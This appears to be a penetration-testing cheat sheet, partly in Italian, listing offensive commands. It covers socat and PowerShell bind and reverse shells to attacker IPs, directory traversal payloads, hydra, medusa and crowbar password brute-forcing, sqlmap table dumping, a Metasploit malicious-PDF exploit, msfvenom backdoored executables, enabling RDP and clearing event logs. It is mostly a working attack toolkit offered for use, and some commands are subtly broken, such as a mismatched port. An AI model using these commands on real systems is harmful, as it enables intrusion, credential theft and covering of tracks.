SOCAT file transfer



(victim)

socat TCP4:10.6.6.6:443 file:file.txt,create



(attacker)

socat TCP4-LISTEN:443,fork file:file.txt



SOCAT Bind shell



(victim)

socat -d -d TCP4-LISTEN:4444 EXEC:/bin/bash



(attacker)

socat - TCP4:192.168.11.11:4444



SOCAT Bind shell crittografato



(victim)

openssl req -newkey RSA:2048 -nodes -keyout bind_shell.key -x509 -days 300 -out bind_shell.crt

cat bind_shell.key bind_shell.crt > bind_shell.pem

sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash



(attacker)

socat - OPENSSL:192.168.11.11:444,verify=0



SOCAT Reverse shell



socat -d -d TCP4-LISTEN:4444 STDOUT



POWERSHELL REVERSE SHELLS



POWERSHELL BIND SHELLS



powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.6.6.6",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()





powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.6.6.6',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"



DIRECTORY TRAVERSAL



192.168.11.11/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd



SITO/scripts/..%c1%1c../winnt/system32/cmd.exe?/c+dir+c:\



kalitutPUNTOcom/practice-of-attacking-directory/

githubPUNTOcom/wireghoul/dotdotpwn





masscan -p22,80,445 192.168.11.0/24





medusa -h 192.168.11.11 -u TheUser -P passwords.txt -M http -m DIR:/test -T 10





crowbar -b rdp -s 192.168.11.11/32 -u TheUser -C /root/words.txt -n 1





hydra -l TheUser -P passwords_list.txt ftpDUEPUNTISLASHSLASH192.168.11.11

hydra -l TheUser -P passwords_list.txt rdpDUEPUNTISLASHSLASH192.168.11.11 -t 4 -V -f

hydra -L userslist.txt -p Password123 imapDUEPUNTISLASHSLASH192.168.11.11/PLAIN

hydra -C users_and_passwds.txt -6 pop3sDUEPUNTISLASHSLASH[fe80::2c:31ff:fe12:ac11]:143/TLS:DIGEST-MD5

hydra -P passwords_list.txt -t 1 -w 5 -f -s 5901 192.168.11.11 vnc -v



hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 sshDUEPUNTISLASHSLASH192.168.11.11

hydra -L users.txt -P passwords_list.txt -M targets.txt ssh

hydra -L users.txt -P passwords_list.txt -M targets.txt ssh -V

hydra -L users.txt -P passwords_list.txt -M targets.txt ssh -s 22 -e ns



githubPUNTOcom/gnebbia/hydra_notes



SQLMAP 1



(First, insert a random username and password in a login form, intercept the request with BURP, then save the BURP captured request in file "request.txt")



sqlmap -r /root/Desktop/request.txt --dbs (enumerates databases, finds possible injection points - returns a SQLmap console)

sqlmap -r /root/Desktop/request.txt --D owasp10 --tables (enumerates tables of database "Owasp10")

sqlmap -r /root/Desktop/request.txt --D owasp10 -T accounts --dump (dumps the content of the "accounts" table of the "owasp10" database)



METASPLOIT CLIENT SIDE



msf > use exploit/windows/fileformat/adobe_utilprintf

msf exploit(adobe_utilprintf) > set FILENAME CITIPolicy.pdf

msf exploit(adobe_utilprintf) > set PAYLOAD windows/meterpreter/reverse_tcp

msf exploit(adobe_utilprintf) > set LHOST 10.6.6.6

msf exploit(adobe_utilprintf) > set LPORT 4455

msf exploit(adobe_utilprintf) > show options

msf exploit(adobe_utilprintf) > exploit



BEFORE the Pdf is opened by the victim, a listener is to be started:



msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f python

msfvenom -a x86 --platform windows -x sol.exe -k -p windows/messagebox lhost=192.168.101.133 -b "\x00" -f exe -o sol_bdoor.exe

msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=172.16.104.130 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe





meterpreter > run post/windows/manage/enable_rdp USERNAME=TheUser PASSWORD=Password123

meterpreter > clearev